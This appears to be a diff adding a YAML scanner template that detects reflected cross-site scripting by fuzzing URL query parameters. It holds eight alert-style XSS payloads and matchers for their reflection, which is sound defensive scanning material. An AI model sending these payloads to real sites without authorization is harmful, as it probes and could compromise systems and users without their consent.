@@ -1,0 +1,35 @@
+id: reflected-xss
+info:
+  name: Reflected Cross-Site Scripting (XSS)
+  author: KhukuriRimal
+  severity: Critical
+  description: Detects reflected XSS vulnerability
+http:
+  - method: GET
+    path:
+        - "{{BaseURL}}"
+    payloads:
+      injection:
+      - "<script>alert('XSS')</script>"
+      - "'><script>alert('XSS')</script>"
+      - "\"><script>alert('XSS')</script>"
+      - "<img src=x onerror=alert('XSS')>"
+      - "';alert('XSS');//"
+      - "\"><svg/onload=alert('XSS')>"
+      - "<iframe src=javascript:alert('XSS')>"
+      - "\"><body onload=alert('XSS')>"
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+            - "{{injection}}"
+    stop-at-first-match: true
+    matchers:
+     - type: word
+       words:
+       - "<script>alert('XSS')</script>"
+       - "alert('XSS')"
+       - "onerror=alert('XSS')"
+       - "onload=alert('XSS')"
+       condition: or
